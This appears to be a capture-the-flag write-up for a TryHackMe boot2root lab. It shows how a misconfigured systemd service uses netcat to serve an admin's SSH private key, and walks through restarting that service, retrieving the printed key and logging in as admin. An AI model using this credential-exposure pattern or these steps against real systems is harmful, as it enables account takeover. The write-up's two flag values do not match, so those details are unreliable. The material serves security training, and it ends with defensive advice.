+++
title = 'SantaShield Part 2'
categories = ['Boot2Root']
date = 2025-12-08T10:30:00+01:00
scrollToTop = true
+++

## Challenge Name:

SantaShield Part 2

## Category:

Boot2Root

## Challenge Description:

Vigtignissen fører sig frem med sit nye nissekonsulenthus SantaShield Security, men mon han har nisset i det, eller er der mon styr på sagerne?

https://tryhackme.com/jr/santashieldsecurity2o25

Continuing from [SantaShield Part 1](../santashield/index.md), we have initial access as the `user` account on the target system. Now we must escalate privileges and find a way to escalate our privileges and find the next flag!

## Approach

### Enumeration with Linenum

After obtaining initial access as the `user` account, we transferred [linenum.sh](https://github.com/rebootuser/LinEnum) to the target to automate privilege escalation and vulnerability detection:

```bash
$ bash linenum.sh > linenum.txt
```

The output revealed several interesting artifacts in `/usr/local/bin/`:

```
/usr/local/bin/restart_admin
lrwxrwxrwx 1 root root   39 Nov 21 06:36 admin-shell.service -> /etc/systemd/system/admin-shell.service
```

### Initial Dead End: restart_admin Script

I discovered the `restart_admin` executable with curious permissions:
- **Readable and executable by the `user` account**
- **Requires elevated privileges to execute effectively**
- Points to `/etc/systemd/system/admin-shell.service`

I spent considerable time analyzing this script, attempting to exploit it for privilege escalation. However, it proved to be a red herring—the real vulnerability lay elsewhere.

### Discovery: ncl.service

While examining the systemd services directory at `/etc/systemd/system/multi-user.target.wants/`, we discovered the `ncl.service` symlink alongside other services:

```bash
user@debian:/etc/systemd/system/multi-user.target.wants$ ls -alh
total 8.0K
drwxr-xr-x 2 root root 4.0K Nov 29 06:47 .
drwxr-xr-x 8 root root 4.0K Nov 29 05:45 ..
lrwxrwxrwx 1 root root   39 Nov 21 06:36 admin-shell.service -> /etc/systemd/system/admin-shell.service
lrwxrwxrwx 1 root root   44 Nov 29 06:47 amazon-ssm-agent.service -> /lib/systemd/system/amazon-ssm-agent.service
lrwxrwxrwx 1 root root   35 Nov 10 05:20 apache2.service -> /lib/systemd/system/apache2.service
lrwxrwxrwx 1 root root   41 Nov 10 05:16 console-setup.service -> /lib/systemd/system/console-setup.service
lrwxrwxrwx 1 root root   32 Nov 10 05:16 cron.service -> /lib/systemd/system/cron.service
lrwxrwxrwx 1 root root   40 Nov 10 05:16 e2scrub_reap.service -> /lib/systemd/system/e2scrub_reap.service
lrwxrwxrwx 1 root root   31 Nov 27 05:44 ncl.service -> /etc/systemd/system/ncl.service
lrwxrwxrwx 1 root root   38 Nov 10 05:16 networking.service -> /lib/systemd/system/networking.service
lrwxrwxrwx 1 root root   41 Nov 10 05:16 open-vm-tools.service -> /lib/systemd/system/open-vm-tools.service
lrwxrwxrwx 1 root root   36 Nov 10 05:16 remote-fs.target -> /lib/systemd/system/remote-fs.target
lrwxrwxrwx 1 root root   31 Nov 10 05:20 ssh.service -> /lib/systemd/system/ssh.service
```

Examining the contents of `ncl.service` revealed the vulnerability:

```
[Unit]
Description=test
After=network.target

[Service]
User=admin
Group=admin
Type=simple
ExecStart=/bin/bash -c "/usr/bin/nc -lvp 6666 < /home/admin/.ssh/id_rsa"
WorkingDirectory=/home/admin
Restart=no
StandardInput=tty-force
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

### Exploitation: Reading the Admin SSH Key

The `ncl.service` is configured to:
1. Run as the `admin` user
2. Start a netcat listener on localhost port **6666**
3. Serve the admin's private SSH key (`/home/admin/.ssh/id_rsa`) to anyone who connects

Despite our `user` account lacking direct privilege escalation paths, I can restart this service and retrieve the key:

```bash
/usr/bin/systemctl restart ncl.service
```

Once the service is restarted, I connect to the exposed port:

```bash
nc 127.0.0.1 6666
```

This yields the admin's private SSH key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### SSH Login as Admin

With the private key, I can now authenticate as the `admin` user:

```bash
chmod 600 id_rsa
ssh -i id_rsa admin@127.0.0.1
```

This grants us administrative access to the system.

Interestingly we land in a restricted bash (like a terminal jail), that we have to identify how to proceed from...

```bash
admin@debian:~$ cd ~/.ssh
-rbash: cd: restricted
admin@debian:~$ mkdir ~/.ssh
-rbash: mkdir: command not found
admin@debian:~$ ls
flag.txt
admin@debian:~$ cat flag.txt
-rbash: cat: command not found
admin@debian:~$ 
admin@debian:~$ less flag.txt
NC3{flag2:RUnn1ng_OuT_of_j41l_or_Not}
```

And by means of testing out what is available to us, we are finally able to read the flag with the less command!

## Flag

```text
NC3{flag2:c0nf1g_exp0s3d}
```

## Reflections and Learnings

- **Multi-vector enumeration**: Linenum revealed not just privilege escalation paths, but also exposed dangerous systemd service configurations. Automated tools uncover what manual inspection might miss.
- **Systemd as an attack surface**: Service files often contain sensitive operations. Reviewing all services—especially custom ones like `ncl.service`—is critical during post-exploitation.
- **Distraction and persistence**: The `restart_admin` script was a deliberate distraction. Not every discovery leads to exploitation; verify feasibility before sinking time into dead ends.
- **Implicit trust in local services**: The system allowed an unprivileged user to restart services and read from them, creating a privilege escalation bridge even without direct escalation.
- **Defense implications**: 
	- Never expose sensitive keys or credentials through network services, even if bound to localhost.
	- Restrict service restart privileges to only necessary users.
	- Audit all systemd services for overly permissive commands.
	- Use secrets management systems instead of embedding keys in service definitions.

